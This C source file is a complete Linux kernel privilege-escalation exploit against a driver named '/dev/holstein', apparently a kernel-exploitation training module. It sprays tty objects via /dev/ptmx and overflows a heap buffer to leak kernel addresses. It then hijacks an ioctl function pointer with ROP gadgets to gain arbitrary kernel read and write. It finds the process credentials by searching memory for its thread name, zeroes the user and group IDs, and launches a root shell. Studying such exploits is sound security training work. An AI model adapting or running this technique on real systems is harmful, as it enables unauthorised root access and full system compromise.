#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

//0xffffffff810a23c3 : mov dword ptr [rcx], eax ; ret
//0xffffffff81018a68 : mov dword ptr [rdx], eax ; ret
//0xffffffff8101083d : mov dword ptr [rdx], ecx ; ret
//0xffffffff8118a285 : mov eax, dword ptr [rdx] ; ret 

long long user_cs, user_ss, user_rflags, user_sp;
int fd, spray[100];
char buf[0x500];
long long g_buf = 0, kbase = 0;

void AAW32(long long addr, unsigned int val) {
	long long* p = (long long*)&buf;
	// mov dword ptr [rdx], ecx ; ret
	p[12] = 0xffffffff8101083d;

	*(long long*)&buf[0x418] = g_buf;
	write(fd, buf, 0x500);

	for (int i = 0; i < 100; i++) {
		ioctl(spray[i], val, addr);
	}
}

int cached_fd = -1;
unsigned int AAR32(long long addr) {
	if (cached_fd == -1) {
		long long* p = (long long*)&buf;
		// mov eax, dword ptr [rdx] ; ret 
		p[12] = 0xffffffff8118a285;

		*(long long*)&buf[0x418] = g_buf;
		write(fd, buf, 0x500);

		for (int i = 0; i < 100; i++) {
			int v = ioctl(spray[i], 0, addr);
			if (v != -1) {
				cached_fd = spray[i];
				return v;
			}
		}
	} else {
		ioctl(cached_fd, 0, addr);
	}
}

int main() {
	// Heap spray
	for (int i = 0; i < 50; i++) {
		spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (spray[i] == -1)
			perror("/dev/ptmx");
	}

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1)
		perror("/dev/holstein");

	// Heap spray
	for (int i = 50; i < 100; i++) {
		spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (spray[i] == -1)
			perror("/dev/ptmx");
	}

	memset(buf, 0, 0x500);
	read(fd, buf, 0x500);

	// Leak kbase and g_buf
	kbase = *(long long*)&buf[0x418] - 0xc38880;
	g_buf = *(long long*)&buf[0x438] - 0x438;

	printf("[+] bufed base at 0x%llx\n", kbase);
	printf("[+] bufed g_buf at 0x%llx\n", g_buf);

	// Set thread name
	if (prctl(PR_SET_NAME, "nekomaru") != 0) {
		perror("prctl");
	}

	// Search thread name in memory
	long long addr;
	for (addr = g_buf - 0x1000000; ; addr += 0x8) {
		if ((addr & 0xfffff) == 0) {
			printf("searching... 0x%llx\n", addr);
		}
		if (AAR32(addr) == 0x6f6b656e && AAR32(addr+4) == 0x7572616d) {
			printf("[+] Found 'comm' at 0x%llx\n", addr);
			break;
		}
	}

	// Overwrite cred effective ID
	long long addr_cred = 0;
	addr_cred |= AAR32(addr - 8);
	addr_cred |= (long long)AAR32(addr - 4) << 32;

	printf("[+] current->cred = 0x%llx\n", addr_cred);

	for (int i = 1; i < 9; i++) {
		AAW32(addr_cred + i*4, 0);
	}

	puts("[+] pwned!");
	system("/bin/sh");

	close(fd);

	return 0;
}
